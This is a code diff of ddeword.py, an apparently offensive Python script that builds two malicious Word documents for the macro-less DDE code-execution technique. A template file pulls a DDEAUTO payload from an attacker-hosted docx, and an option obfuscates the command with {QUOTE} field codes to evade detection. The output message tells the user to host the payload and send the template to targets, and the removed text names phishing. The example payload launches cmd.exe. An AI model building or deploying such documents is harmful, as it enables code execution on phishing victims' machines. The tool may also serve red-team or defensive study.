@@ -9,22 +9,34 @@ __version__ = "1.0"
 __author__ = "0xdeadbeefJERKY"
 
 """
+Overview:
 Leverages the macro-less DDE code execution technique described 
 by @_staaldraad and @0x5A1F (blog post link in References 
 section below) to generate two malicious Word documents:
 
-template-final.docx
-- This is the document sent to the target (e.g., via phishing).
-  The webSettings configured to pull DDE from payload-final.docx, 
-  which is hosted by a server specified by the user. 
+Usage:
+Insert a simple (unobfuscated) DDE command string into the 
+payload document:
 
-payload-final.docx
+    python ddeword.py
+
+Insert an obfuscated DDE command string by way of the {QUOTE} 
+field code technique into the payload document:
+
+    python ddeword.py --obfuscate
+
+Both forms of usage will generate two Word documents:
+
+*out/template-final.docx*
+- The webSettings are configured to pull the DDE element from 
+  payload-final.docx or   payload-obfuscated-final.docx, which 
+  is hosted by a server specified by the user. 
+
+*out/payload-final.docx* (not obfuscated)  
+*out/payload-obfuscated-final.docx* (obfuscated)
 - Contains user-provided DDE payload/command string. Hosted by
-  attacker-controlled server (URL provided by user and baked
-  into template-final.docx).
-
-Obfuscation and evasion techniques inspired by @_staaldraad
-(blog post link in References setion below). 
+  user-controlled server (URL provided by user and baked into 
+  template-final.docx).
 
 References:
 https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
@@ -47,14 +59,11 @@ def arg_parse():
 
 def obfuscate_dde(payload):
     """Obfuscate DDE payload using {QUOTE} field code."""
-    print "[*] Converting DDE payload using {QUOTE} field code..."    
-    #out = "{ QUOTE "
     out = " QUOTE "
     
     for c in payload:
         out += (" %s"%ord(c))
     
-    #out += " }"
     return out
 
 def gen_payload(obfuscate):
@@ -71,29 +80,31 @@ def gen_payload(obfuscate):
     
     """
     # Example set of DDE arguments to form payload
-    "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\cmd.exe"
+    "C:\\Program\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\cmd.exe"
     "/c calc.exe"
     "for security reasons"
     """
 
     # Obfuscate provided DDE payload (if enabled)
     if obfuscate:
+        print "[*] Converting DDE payload using {QUOTE} field code..."    
         obfusc_payload = []
         obfusc_payload.append(obfuscate_dde(payload[1].replace('\\\\','\\')))
         obfusc_payload.append(obfuscate_dde(payload[2].replace('\\\\','\\')))
         obfusc_payload.append(obfuscate_dde(payload[3].replace('\\\\','\\')))
     else:
-        payload = " ".join(payload)
-        obfusc_payload = payload
+        payload[1] = '"' + payload[1] + '"'
+        payload[2] = '"' + payload[2] + '"'
+        payload[3] = '"' + payload[3] + '"'
     
-
+    payload = " ".join(payload)
     print '[*] Selected DDE payload: {}'.format(payload)
 
     if obfuscate:
         print '[*] Obfuscated DDE payload: {}'.format(obfusc_payload)
 
     # Prompt user for server hosting payload Office document (referenced by 'template')
-    targetsvr = raw_input("[-] Enter server URL (hosting payload Office file): ")
+    targetsvr = raw_input("[-] Enter server URL (hosting payload Word file): ")
     if obfuscate:
         targetsvr = targetsvr + '/payload-obfuscated-final.docx'
         #targetsvr = 'http://localhost:8000/payload-obfuscated-final.docx'
@@ -101,7 +112,10 @@ def gen_payload(obfuscate):
         targetsvr = targetsvr + '/payload-final.docx'
         #targetsvr = 'http://localhost:8000/payload-final.docx'
 
-    return obfusc_payload, targetsvr
+    if obfuscate:
+        return obfusc_payload, targetsvr
+    else:
+        return payload, targetsvr
 
 if __name__ == "__main__":
     # Parse arguments from command-line
@@ -137,26 +151,25 @@ if __name__ == "__main__":
     # Find 'webSettings' XML element and insert frameset as child element
     for node in webtree.iter(tag=etree.Element):
         if node.tag == word_schema + "webSettings":
-            print '[*] Inserting frameset XML element into word/webSettings.xml...'
+            print '[*] Inserting frameset XML element into {}/word/webSettings.xml...'.format(template_out)
             node.insert(0,frameset)
 
     # Formulate XML elements necessary to insert nested, obfuscated DDE payload into 
     # payload.docx/word/document.xml (for obfuscated payloads only)
     instrtext = '''
-                <w:body xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:p w:rsidR="00830AD6" w:rsidRDefault="00830AD6" w:rsidP="00830AD6"><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>SET c</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>"</w:instrText></w:r><w:fldSimple w:instr=" ''' + obfusc_payload[0] + '''  "><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r><w:instrText>"</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p><w:p w:rsidR="00830AD6" w:rsidRDefault="00830AD6" w:rsidP="00830AD6"><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>SET d</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> "</w:instrText></w:r><w:fldSimple w:instr=" ''' + obfusc_payload[1] + '''  "><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r><w:instrText xml:space="preserve">" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p><w:p w:rsidR="00830AD6" w:rsidRDefault="00830AD6" w:rsidP="00830AD6"><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>SET e</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> "</w:instrText></w:r><w:fldSimple w:instr=" ''' + obfusc_payload[2] + '''  "><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r><w:instrText xml:space="preserve">" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r><w:bookmarkStart w:id="0" w:name="_GoBack"/><w:bookmarkEnd w:id="0"/></w:p><w:p w:rsidR="00522B43" w:rsidRDefault="00BF6731"><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText xml:space="preserve"> DDEAUTO</w:instrText></w:r><w:r w:rsidR="00830AD6"><w:instrText xml:space="preserve"> </w:instrText></w:r><w:fldSimple w:instr=" REF c "><w:r w:rsidR="00830AD6"><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r w:rsidR="00830AD6"><w:instrText xml:space="preserve"> </w:instrText></w:r><w:fldSimple w:instr=" REF d "><w:r w:rsidR="00830AD6"><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r w:rsidR="00830AD6"><w:instrText xml:space="preserve"> </w:instrText></w:r><w:fldSimple w:instr=" REF e "><w:r w:rsidR="00830AD6"><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:t>!Unexpected End of Formula</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p><w:sectPr w:rsidR="00522B43"><w:pgSz w:w="12240" w:h="15840"/><w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/><w:cols w:space="720"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body>
+                <w:body xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:p w:rsidR="00830AD6" w:rsidRDefault="00830AD6" w:rsidP="00830AD6"><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>SET c</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>"</w:instrText></w:r><w:fldSimple w:instr=" ''' + obfusc_payload[0] + '''  "><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r><w:instrText>"</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p><w:p w:rsidR="00830AD6" w:rsidRDefault="00830AD6" w:rsidP="00830AD6"><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>SET d</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> "</w:instrText></w:r><w:fldSimple w:instr=" ''' + obfusc_payload[1] + '''  "><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r><w:instrText xml:space="preserve">" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p><w:p w:rsidR="00830AD6" w:rsidRDefault="00830AD6" w:rsidP="00830AD6"><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>SET e</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> "</w:instrText></w:r><w:fldSimple w:instr=" ''' + obfusc_payload[2] + '''  "><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r><w:instrText xml:space="preserve">" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r><w:bookmarkStart w:id="0" w:name="_GoBack"/><w:bookmarkEnd w:id="0"/></w:p><w:p w:rsidR="00522B43" w:rsidRDefault="00BF6731"><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText xml:space="preserve"> DDEAUTO</w:instrText></w:r><w:r w:rsidR="00830AD6"><w:instrText xml:space="preserve"> </w:instrText></w:r><w:fldSimple w:instr=" REF c "><w:r w:rsidR="00830AD6"><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r w:rsidR="00830AD6"><w:instrText xml:space="preserve"> </w:instrText></w:r><w:fldSimple w:instr=" REF d "><w:r w:rsidR="00830AD6"><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r w:rsidR="00830AD6"><w:instrText xml:space="preserve"> </w:instrText></w:r><w:fldSimple w:instr=" REF e "><w:r w:rsidR="00830AD6"><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate" w:dirty="true"/></w:r><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:t>!Unexpected End of Formula</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p><w:sectPr w:rsidR="00522B43"><w:pgSz w:w="12240" w:h="15840"/><w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/><w:cols w:space="720"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body>
                 '''
 
     # Find 'instrText' XML element and change value to DDE payload
+    print '[*] Inserting DDE payload into {}/word/document.xml...'.format(payload_out)
     if obfuscate:
         for node in doctree.iter(tag=etree.Element):
             if node.tag == word_schema + "document":
-                print '[*] Inserting DDE payload into document.xml...'
                 instrtext = etree.fromstring(instrtext)
                 node.insert(0, instrtext)
     else:
         for node in doctree.iter(tag=etree.Element):
             if node.tag == word_schema + "instrText":
-                print '[*] Inserting DDE payload into document.xml...'
                 node.text = obfusc_payload
     
     # Create temp directories and extract both payload.docx and template.docx files to them
@@ -188,8 +201,8 @@ if __name__ == "__main__":
     filenames_template = zftemplate.namelist()
 
     # Now, create the new zip file and add all the files into the archive
-    zfcopypay = payload_out
-    zfcopytemplate = template_out
+    zfcopypay = 'out/' + payload_out
+    zfcopytemplate = 'out/' + template_out
 
     with zipfile.ZipFile(zfcopypay, "w") as doc:
         for filename in filenames_pay:
@@ -206,4 +219,4 @@ if __name__ == "__main__":
     shutil.rmtree(tmp_dir_pay)
     shutil.rmtree(tmp_dir_template)
 
-    print '[*] Payload generation complete! Host {} on your server and send {} to your target.'.format(payload_out, template_out)
+    print '[*] Payload generation complete! Delivery methods below:\n\t1. Host {} at {} and send {} to your target(s).\n\t2. Send {} directly to your target(s).'.format(payload_out, targetsvr, template_out, payload_out)
